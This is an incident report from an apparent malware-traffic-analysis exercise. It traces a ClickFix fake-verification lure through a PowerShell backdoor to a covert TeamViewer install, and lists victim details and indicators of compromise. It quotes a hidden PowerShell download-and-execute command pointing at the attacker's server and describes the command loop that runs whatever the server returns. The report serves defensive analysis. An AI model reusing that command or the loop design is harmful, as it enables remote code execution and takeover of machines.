# Incident Report — MTA 2025-01-22 Traffic Analysis

## Victim host

| Attribute | Value |
|---|---|
| IPv4 address | **10.1.17.215** |
| MAC address | **00:d0:b7:26:4a:74** |
| Windows hostname | **DESKTOP-L8C5GSJ** (AD domain `bluemoontuesday.com`, workgroup name `BLUEMOONTUESDAY` in NBNS) |
| Logged-in Windows user | **shutchenson** (seen as Kerberos AS-REQ CNameString from 10.1.17.215) |

## Malware family and attribution

**ClickFix-style fake-verification loader deploying a PowerShell backdoor, followed by covert TeamViewer RAT installation.**

Attribution is **behavioral, not signature-confirmed** — the evidence directory contains only the raw pcap (no Suricata/IDS alert export), so there is no signature hit to cite. The classification is based on the following observed behavior chain, which matches the well-documented "ClickFix" social-engineering pattern (fake CAPTCHA/"verify you are human" page tricks the user into pasting an `mshta`/PowerShell command into the Windows Run dialog):

1. **23:45:34–23:45:49** — victim resolves and TLS-connects to a chain of fake-verification lure domains: `google-authenticator.burleson-appliance.net` → `authenticatoor.org` → `appointedtimeagriculture.com` (the "authenticatoor" name matches known ClickFix page-builder infrastructure used to generate fake Google/Cloudflare verification pages).
2. **23:45:56** — victim fetches `http://5.252.153.241/api/file/get-file/264872`, an HTA/VBScript "component" that:
   - decoy-opens `https://azure.microsoft.com` in the browser to look legitimate
   - silently runs `powershell -WindowStyle Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://5.252.153.241/api/file/get-file/29842.ps1')"`
3. **23:45:58** — `29842.ps1` is fetched and executed. Decoded, it computes the C: drive **volume serial number** as a bot ID, then loops forever: `GET http://5.252.153.241/<serial>` every ~5 seconds and `Invoke-Expression`s whatever the server returns — a live interactive PowerShell command-and-control channel. This beacon (`GET /1517096937`) runs continuously from 23:45:58 through the end of the capture (00:38:18), including status callbacks such as `?k=script: RunRH, status: OK, message: PS process started` and `?k=message = startup shortcut created; status = success;`, i.e. persistence was installed.
4. **23:47:01–23:47:05** — the C2 pushes down and the host silently installs a full **TeamViewer** remote-access client (`TeamViewer`, `Teamviewer_Resource_fr`, `TV`) plus a second obfuscated PowerShell payload (`pas.ps1`, functionally identical to `29842.ps1`), giving the actor hands-on-keyboard remote control disguised as a legitimate remote-support tool.
5. **23:59:46** — victim establishes an outbound TLS session to `45.125.66.32:2917`, consistent with a TeamViewer relay/session connection, indicating an operator took interactive control of the host.

This "ClickFix lure → PowerShell disk-serial C2 loop → covert TeamViewer install" chain is a recognized technique for remote-access-trojan delivery; it is reported here as a behavioral finding since no AV/IDS detection name was present in the evidence set.

## Indicators of Compromise

**C2 endpoints**
- `5.252.153.241:80` — primary C2: staging server for payload delivery (`/api/file/get-file/*`) and the disk-serial-keyed command loop (`GET /<serial>` every ~5s)
- `45.125.66.32:2917` — TeamViewer/relay TLS session post-compromise (interactive remote-control traffic)

**Malicious/lure domains (DNS-resolved and TLS-connected to from the victim)**
- `google-authenticator.burleson-appliance.net` → 104.21.64.1 (Cloudflare-fronted)
- `authenticatoor.org` → 82.221.136.26
- `appointedtimeagriculture.com` → 217.70.186.109
- `master16.teamviewer.com` → 185.188.32.26 (legitimate TeamViewer infra, abused post-install)
- `ping3.dyngate.com` (TeamViewer keep-alive, abused post-install)

**Malicious URLs**
- `http://5.252.153.241/api/file/get-file/264872` (HTA/VBScript ClickFix launcher)
- `http://5.252.153.241/api/file/get-file/29842.ps1` (obfuscated PowerShell backdoor loader)
- `http://5.252.153.241/api/file/get-file/pas.ps1` (second-stage copy of the loader)
- `http://5.252.153.241/api/file/get-file/TeamViewer`
- `http://5.252.153.241/api/file/get-file/Teamviewer_Resource_fr`
- `http://5.252.153.241/api/file/get-file/TV`
- `http://5.252.153.241/<disk-serial-number>` (e.g. `/1517096937`) — the recurring C2 beacon/command channel

| pas.ps1 (PowerShell backdoor loader, 2nd copy) | 1,553 B | a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e |

## Summary

DESKTOP-L8C5GSJ (10.1.17.215, MAC 00:d0:b7:26:4a:74), logged on as domain user `shutchenson`, was compromised via a ClickFix-style fake-verification lure that led to execution of an obfuscated PowerShell backdoor communicating with 5.252.153.241 over an infinite disk-serial-keyed command loop. The actor used this channel to push a legitimate-but-abused TeamViewer client onto the host, then pivoted to interactive remote control (TLS session to 45.125.66.32:2917). The C2 beacon was still active at the end of the capture (00:38:18), indicating the compromise was ongoing when collection stopped.
